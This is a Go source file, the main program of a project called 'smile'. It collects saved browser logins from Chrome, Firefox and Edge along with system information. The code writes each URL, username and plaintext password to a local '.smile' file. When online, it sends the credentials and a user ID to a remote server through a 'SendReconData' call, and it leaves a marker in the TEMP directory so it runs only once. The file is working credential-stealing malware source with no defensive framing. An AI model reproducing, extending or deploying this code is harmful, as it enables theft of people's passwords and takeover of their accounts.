package main

import (
	"fmt"
	"os"
	"regexp"
	"smile/browsers"
	"smile/config"
	"smile/device"
	"smile/features"
	"smile/requests"
)

func main() {

	config.SetConfig()
	features.AllowFeatures()
	if config.USER_ID != "" && checkWrittenStatus() {
		fmt.Println("Already saved data :)")
		return
	}

	Data := []browsers.Credential{}

	// Concat credentials from browsers with Data
	Data = append(Data, browsers.Chrome()...)
	Data = append(Data, browsers.Firefox()...)
	Data = append(Data, browsers.Edge()...)
	// Data = append(Data, browsers.Opera()...);
	// Data = append(Data, browsers.Safari()...);

	data := map[string]interface{}{
		"userId":      config.USER_ID,
		"credentials": Data,
		"sysinfo":     device.GetSysInfo(),
	}

	writtenToFile := false
	if config.WRITE_FILE != "never" || config.USER_ID == "" {
		err := writetoSmile(Data)
		if err != nil {
			fmt.Println(err.Error())
		} else {
			writtenToFile = true
		}
	}

	if config.USER_ID != "" && config.ONLINE {
		response, err := requests.SendReconData(data)
		if err != nil {
			fmt.Println("Something went wrong...")
			if config.WRITE_FILE == "offline" && !writtenToFile {
				err := writetoSmile(Data)
				if err != nil {
					fmt.Println(err.Error())
				}
			}
		}
		fmt.Println(response)
	}

	if config.USER_ID != "" {
		setWrittenStatus()
	}
	fmt.Println("Done :)")
}

func checkWrittenStatus() bool {
	file, err := os.ReadFile(fmt.Sprintf("%s/.smile", os.Getenv("TEMP")))
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	re := regexp.MustCompile(fmt.Sprintf("ID=%s\n", config.USER_ID))
	return re.MatchString(string(file))
}

func setWrittenStatus() {
	_, err := os.Stat(fmt.Sprintf("%s/.smile", os.Getenv("TEMP")))
	if err != nil {
		err = os.WriteFile(fmt.Sprintf("%s/.smile", os.Getenv("TEMP")), []byte(fmt.Sprintf("ID=%s\n", config.USER_ID)), 0644)
		if err != nil {
			fmt.Println(err.Error())
		}
	} else {
		file, err := os.OpenFile(fmt.Sprintf("%s/.smile", os.Getenv("TEMP")), os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println(err.Error())
		}
		defer file.Close()

		_, err = file.WriteString(fmt.Sprintf("ID=%s\n", config.USER_ID))
		if err != nil {
			fmt.Println(err.Error())
		}
	}
}

func writetoSmile(Data []browsers.Credential) error {
	perm := os.ModePerm
	if _, err := os.Stat(".smile"); err == nil {
		perm = os.ModeAppend
	}
	dataFile, err := os.OpenFile(".smile", os.O_APPEND|os.O_CREATE|os.O_WRONLY, perm)
	if err != nil {
		return err
	}
	defer dataFile.Close()

	for _, credential := range Data {
		dataFile.WriteString("browser: " + credential.Browser + "\n")
		dataFile.WriteString("url: " + credential.URL + "\n")
		dataFile.WriteString("username: " + credential.Username + "\n")
		dataFile.WriteString("password: " + credential.Password + "\n\n")
	}

	return nil
}
